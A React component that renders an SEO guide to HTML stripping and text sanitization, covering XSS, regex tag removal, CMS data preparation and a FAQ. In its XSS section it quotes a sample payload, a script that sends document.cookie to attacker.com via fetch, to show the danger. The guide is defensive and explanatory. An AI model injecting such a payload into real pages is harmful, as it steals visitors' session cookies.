import React, { useState } from 'react';

export const SeoArticleModalContent: React.FC = () => {
  const [isExpanded, setIsExpanded] = useState(false);

  const jsonLdData = {
    "@context": "https://schema.org",
    "@graph": [
      {
        "@type": "WebSite",
        "url": "https://example.com/",
        "name": "Pure JS HTML/Text Stripper",
        "publisher": {
          "@type": "Organization",
          "name": "HSINI MOHAMED"
        }
      },
      {
        "@type": "WebApplication",
        "name": "HTML/Text Stripper",
        "operatingSystem": "All",
        "applicationCategory": "DeveloperApplication",
        "offers": {
          "@type": "Offer",
          "price": "0"
        }
      },
      {
        "@type": "Article",
        "headline": "The Ultimate Guide to Text Cleaning and HTML Sanitization",
        "author": {
          "@type": "Person",
          "name": "HSINI MOHAMED"
        },
        "publisher": {
          "@type": "Organization",
          "name": "doodax.com"
        },
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https://example.com/guide"
        }
      },
      {
        "@type": "FAQPage",
        "mainEntity": [
          {
            "@type": "Question",
            "name": "Why is it important to remove HTML from user input?",
            "acceptedAnswer": {
              "@type": "Answer",
              "text": "Removing HTML from user input is crucial for security and data integrity. It prevents Cross-Site Scripting (XSS) attacks, where malicious scripts are injected into web pages. It also ensures that data stored in databases is clean, consistent, and free of formatting, which improves searchability and reduces storage overhead."
            }
          },
          {
            "@type": "Question",
            "name": "What is the difference between text cleaning and data sanitization?",
            "acceptedAnswer": {
              "@type": "Answer",
              "text": "Text cleaning focuses on improving the quality of text by removing noise (like HTML tags), correcting typos, and standardizing format. Data sanitization is a broader security measure that involves removing or neutralizing potentially malicious code or characters from all user inputs, not just text, to prevent attacks like XSS and SQL injection."
            }
          },
          {
            "@type": "Question",
            "name": "Can I use Regular Expressions for all HTML stripping tasks?",
            "acceptedAnswer": {
              "@type": "Answer",
              "text": "While regular expressions are powerful for simple HTML stripping, they can be unreliable for complex, nested, or malformed HTML. For robust, security-critical applications, it's often better to use a dedicated HTML parsing library (like DOMParser in browsers) that understands the HTML structure and can more accurately strip tags while preserving content."
            }
          }
        ]
      }
    ]
  };

  return (
    <>
      <script type="application/ld+json" dangerouslySetInnerHTML={{ __html: JSON.stringify(jsonLdData) }} />
      <div className="relative">
        <div 
          className="overflow-hidden transition-all duration-700 ease-in-out"
          style={{ maxHeight: isExpanded ? '5000px' : '150px' }}
        >
          <article>
            <section>
              <h2>The Ultimate Guide to Text Cleaning, HTML Sanitization, and Data Preparation</h2>
              <p>In the digital age, data is the new oil. But raw, unstructured data is often messy, inconsistent, and sometimes, even dangerous. This is where text cleaning and HTML sanitization become indispensable processes for developers, content managers, and data scientists. This comprehensive guide explores the critical importance of transforming raw input into clean, safe, and usable plain text, particularly within content management systems (CMS), databases, and for SEO purposes.</p>
            </section>

            <nav>
              <h3>Table of Contents</h3>
              <ol>
                <li><a href="#importance">The Importance of Plain Text: Why Clean Data Matters</a></li>
                <li><a href="#security-risks">Security Risks of Raw HTML Input: The Dangers of XSS</a></li>
                <li><a href="#regex">The Role of Regular Expressions in Front-End Processing</a></li>
                <li><a href="#data-prep">Data Preparation for Content Management and Databases</a></li>
                <li><a href="#seo-impact">Impact on SEO: Clean Data for Better Rankings</a></li>
                <li><a href="#html-table">Common HTML Tags and Their Plain Text Equivalents</a></li>
                <li><a href="#faq">Frequently Asked Questions (FAQ)</a></li>
              </ol>
            </nav>

            <section id="importance">
              <h3>1. The Importance of Plain Text: Why Clean Data Matters</h3>
              <p>Plain text is the universal common denominator of data. It's lightweight, universally compatible, and free from the complexities of formatting, styling, and executable code that rich text or HTML contains. The process of stripping HTML tags to extract plain text is fundamental for several reasons:</p>
              <ul>
                <li><strong>Database Integrity:</strong> Storing raw HTML in a database is inefficient and problematic. It inflates storage size, complicates indexing and searching, and can lead to inconsistent data representation. When you search for "Hello World," you don't want to miss a result because it's stored as `<strong>Hello<em>World</em></strong>`. Storing plain text ensures data uniformity and makes full-text searches faster and more reliable.</li>
                <li><strong>Content Portability:</strong> Clean text can be easily repurposed across different platforms and mediums. The same plain text can be used for a web page, a mobile app notification, an email, or a PDF document without worrying about broken tags or incompatible formatting.</li>
                <li><strong>Improved User Experience:</strong> In many contexts, such as search result snippets, meta descriptions, or user comments, displaying raw HTML can break the UI layout and confuse users. Presenting clean, readable text ensures a consistent and professional user experience.</li>
                <li><strong>Data Analysis:</strong> For machine learning and natural language processing (NLP), clean text is a prerequisite. HTML tags are noise that can skew analytical results, making it harder to perform tasks like sentiment analysis, topic modeling, or keyword extraction.</li>
              </ul>
            </section>

            <section id="security-risks">
              <h3>2. Security Risks of Raw HTML Input: The Dangers of XSS</h3>
              <p>Perhaps the most critical reason to sanitize user input is security. Allowing users to submit raw HTML opens a Pandora's box of vulnerabilities, the most notorious of which is Cross-Site Scripting (XSS).</p>
              <p>XSS is an injection attack where a malicious actor injects malicious scripts (usually JavaScript) into a trusted website. When another user visits the compromised page, the malicious script executes in their browser, allowing the attacker to steal sensitive information like session cookies, login credentials, or personal data.</p>
              <blockquote>
                An attacker could inject a script via a comment form: `<script>fetch('https://attacker.com/steal?cookie=' + document.cookie)</script>`. If this is rendered on the page, the script will execute for every user who views it.
              </blockquote>
              <p>HTML stripping and sanitization are the first lines of defense against XSS. By removing tags like `<script>`, `<iframe>`, and event handlers like `onclick` or `onerror`, you neutralize the threat. A proper sanitizer will parse the HTML, allow a "whitelist" of safe tags (like `<b>`, `<i>`, `<p>`), and discard everything else, ensuring that no executable code can be embedded.</p>
            </section>

            <section id="regex">
              <h3>3. The Role of Regular Expressions in Front-End Processing</h3>
              <p>Regular Expressions, or Regex, are patterns used to match character combinations in strings. They are an incredibly powerful tool for text manipulation and are often used for quick and efficient HTML stripping on the client-side.</p>
              <p>A simple Regex to remove all HTML tags is `/<[^>]*>/g`. Let's break it down:</p>
              <ul>
                <li>`<`: Matches the opening bracket of a tag.</li>
                <li>`[^>]*`: This is the core part. `[^>]` matches any character that is NOT a closing bracket. The `*` means "zero or more times." This effectively matches all the content inside a tag.</li>
                <li>`>`: Matches the closing bracket.</li>
                <li>`/g`: This is a global flag, meaning it will find all matches in the string, not just the first one.</li>
              </ul>
              <p>While this Regex is effective for many simple cases, it has limitations. It can be fooled by malformed HTML or by `>` characters within attributes. For example, it might fail on `<input title="value > 10">`. For robust, security-focused applications, using the browser's built-in `DOMParser` is a safer approach. This API parses the string into a DOM document in memory, from which you can safely extract the `textContent`, effectively stripping all tags without the pitfalls of Regex.</p>
            </section>
            
            <section id="data-prep">
                <h3>4. Data Preparation for Content Management and Databases</h3>
                <p>In a Content Management System (CMS), content is king, but the preparation of that content is what makes the kingdom run smoothly. When a user submits a blog post, a product description, or a comment, that data begins a journey. Proper preparation at the point of entry is crucial.</p>
                <p>The ideal workflow involves several steps:</p>
                <ol>
                    <li><strong>Initial Capture:</strong> The raw input is captured from a form, often from a rich text editor that produces HTML.</li>
                    <li><strong>Sanitization:</strong> The raw HTML is immediately sanitized on the server-side to remove any security threats. A whitelist of allowed tags and attributes is applied.</li>
                    <li><strong>Plain Text Extraction:</strong> A plain text version of the content is generated by stripping all remaining HTML tags.</li>
                    <li><strong>Dual Storage:</strong> The sanitized, "safe" HTML is stored for rendering purposes (e.g., displaying the formatted blog post). The extracted plain text version is stored in a separate column or field. This plain text version is used for internal searches, generating SEO meta descriptions, creating content previews, and feeding into analytics pipelines.</li>
                </ol>
                <p>This dual-storage strategy provides the best of both worlds: rich formatting for users and clean, searchable, and safe data for the system's backend and analytical processes.</p>
            </section>

            <section id="seo-impact">
                <h3>5. Impact on SEO: Clean Data for Better Rankings</h3>
                <p>Search Engine Optimization (SEO) is heavily reliant on clean, well-structured text. Search engine crawlers like Googlebot parse the HTML of a webpage but pay special attention to the textual content. Here’s how text cleaning directly impacts SEO:</p>
                <ul>
                    <li><strong>Meta Descriptions:</strong> Search engines often use the meta description tag for the search result snippet. If you auto-generate this from your content, it's essential to use the plain text version. A snippet full of broken HTML tags looks unprofessional and will deter users from clicking.</li>
                    <li><strong>Keyword Density and Readability:</strong> Search engines analyze the text of a page to understand its topic. HTML tags are noise in this context. Clean text allows for accurate analysis of keyword density, readability scores, and semantic relevance, which are all factors in search rankings.</li>
                    <li><strong>Structured Data:</strong> Rich snippets and other advanced search features rely on structured data formats like JSON-LD (as used in this very article!). This data must be clean and accurately represent the content. Generating it from a plain text source ensures no formatting issues corrupt the structured data schema.</li>
                    <li><strong>Page Load Speed:</strong> While minor, clean data can contribute to faster page loads. Storing and transmitting lean plain text is more efficient than bloated HTML, and faster sites are favored by Google.</li>
                </ul>
            </section>

            <section id="html-table">
              <h3>6. Common HTML Tags and Their Plain Text Equivalents</h3>
              <p>The goal of an HTML stripper is to remove the tags while preserving the meaningful content they enclose. Here is a table showing common tags and what remains after processing.</p>
              <table>
                <thead>
                  <tr>
                    <th>Example HTML</th>
                    <th>Plain Text Equivalent</th>
                    <th>Notes</th>
                  </tr>
                </thead>
                <tbody>
                  <tr>
                    <td>`<h1>Main Title</h1>`</td>
                    <td>Main Title</td>
                    <td>The heading tag is removed, leaving the text.</td>
                  </tr>
                  <tr>
                    <td>`<p>A paragraph of text.</p>`</td>
                    <td>A paragraph of text.</td>
                    <td>Paragraph tags are removed. Line breaks might need to be handled separately.</td>
                  </tr>
                  <tr>
                    <td>`<strong>Important!</strong>`</td>
                    <td>Important!</td>
                    <td>Styling tags like `<strong>`, `<em>`, `<b>`, `<i>` are removed.</td>
                  </tr>
                  <tr>
                    <td>`<a href="/page">Click here</a>`</td>
                    <td>Click here</td>
                    <td>The link tag is removed, leaving only the anchor text.</td>
                  </tr>
                  <tr>
                    <td>`<img src="image.jpg" alt="An image">`</td>
                    <td></td>
                    <td>Image tags are typically removed entirely as they have no inner text. Good strippers might extract the `alt` text.</td>
                  </tr>
                   <tr>
                    <td>`<ul><li>Item 1</li><li>Item 2</li></ul>`</td>
                    <td>Item 1 Item 2</td>
                    <td>List tags are removed. A more advanced stripper might add hyphens or numbers to simulate the list structure.</td>
                  </tr>
                </tbody>
              </table>
            </section>

            <section id="faq">
              <h3>7. Frequently Asked Questions (FAQ)</h3>
              <dl>
                <dt>Why is it important to remove HTML from user input?</dt>
                <dd>Removing HTML from user input is crucial for security and data integrity. It prevents Cross-Site Scripting (XSS) attacks, where malicious scripts are injected into web pages. It also ensures that data stored in databases is clean, consistent, and free of formatting, which improves searchability and reduces storage overhead.</dd>

                <dt>What is the difference between text cleaning and data sanitization?</dt>
                <dd>Text cleaning focuses on improving the quality of text by removing noise (like HTML tags), correcting typos, and standardizing format. Data sanitization is a broader security measure that involves removing or neutralizing potentially malicious code or characters from all user inputs, not just text, to prevent attacks like XSS and SQL injection.</dd>
                
                <dt>Can I use Regular Expressions for all HTML stripping tasks?</dt>
                <dd>While regular expressions are powerful for simple HTML stripping, they can be unreliable for complex, nested, or malformed HTML. For robust, security-critical applications, it's often better to use a dedicated HTML parsing library (like DOMParser in browsers) that understands the HTML structure and can more accurately strip tags while preserving content.</dd>
                
                <dt>Should I perform HTML stripping on the client-side or server-side?</dt>
                <dd>Both. Client-side stripping (like in this tool) is great for providing immediate user feedback and a better UI experience. However, you should NEVER trust client-side validation for security. Always perform robust sanitization and stripping on the server-side before storing data, as a malicious user can easily bypass any client-side scripts.</dd>
              </dl>
            </section>
          </article>
        </div>

        <div className={`relative mt-2 ${isExpanded ? 'flex justify-center' : ''}`}>
          {!isExpanded && (
            <div className="absolute bottom-0 left-0 w-full h-24 bg-gradient-to-t from-slate-900 to-transparent pointer-events-none -mt-24"></div>
          )}
          <button
            onClick={() => setIsExpanded(!isExpanded)}
            className="relative z-10 px-6 py-2 bg-cyan-600/50 hover:bg-cyan-600/80 text-cyan-200 font-semibold rounded-full shadow-md transition-all duration-300"
          >
            {isExpanded ? 'Show Less' : 'Read Full Article'}
          </button>
        </div>
      </div>
    </>
  );
};
